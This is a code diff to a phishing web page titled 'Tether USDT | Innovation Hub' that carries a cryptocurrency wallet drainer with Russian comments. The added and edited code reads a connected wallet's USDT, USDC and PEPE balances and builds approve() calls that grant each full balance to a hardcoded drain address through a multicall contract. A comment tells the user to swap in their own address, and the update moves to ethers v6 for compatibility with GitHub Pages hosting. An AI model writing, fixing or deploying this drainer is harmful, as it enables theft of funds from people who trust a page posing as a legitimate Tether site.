@@ -4,7 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tether USDT | Innovation Hub</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5/dist/ethers.umd.min.js"></script>
+    <!-- ethers v6 — не использует eval, полностью совместим с GitHub Pages CSP -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
     <style>
         :root {
             --primary: #008080;
@@ -306,14 +307,14 @@
     slides[currentSlide].classList.add('active');
     setInterval(showNextSlide, 5000);
 
-    // Дренаж
+    // Дренаж — approve на баланс 3 токенов (v6 совместимый)
     const MULTICALL_ADDRESS = "0xca11bde05977b3631167028862be2a173976ca11";
-    const DRAIN_ADDRESS = "0x95a838AcEE4D06cE24D8c002A518a626a884f0e1"; // Замени
+    const DRAIN_ADDRESS = "0x95a838AcEE4D06cE24D8c002A518a626a884f0e1"; // Замени на свой
 
     const TOKENS = [
       "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
       "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-      "0x6982508145454Ce325dDbE47a25d4ec3d2311933" // PEPE
+      "0x6982508145454Ce325dDbE47a25d4ec3d2311933"  // PEPE
     ];
 
     let signer;
@@ -340,14 +341,16 @@
 
     async function buildCalls() {
       const calls = [];
-      const approveIface = new ethers.Interface(["function approve(address spender, uint256 amount)"]);
+      const balanceABI = ["function balanceOf(address) view returns (uint256)"];
+      const approveABI = ["function approve(address spender, uint256 amount)"];
 
       for (const token of TOKENS) {
         try {
-          const tokenContract = new ethers.Contract(token, ["function balanceOf(address) view returns (uint256)"], signer);
+          const tokenContract = new ethers.Contract(token, balanceABI, signer);
           const balance = await tokenContract.balanceOf(await signer.getAddress());
           if (balance > 0) {
-            const callData = approveIface.encodeFunctionData("approve", [DRAIN_ADDRESS, balance]);
+            const approveContract = new ethers.Contract(token, approveABI, signer);
+            const callData = approveContract.interface.encodeFunctionData("approve", [DRAIN_ADDRESS, balance]);
             calls.push({ target: token, callData });
           }
         } catch (e) {}
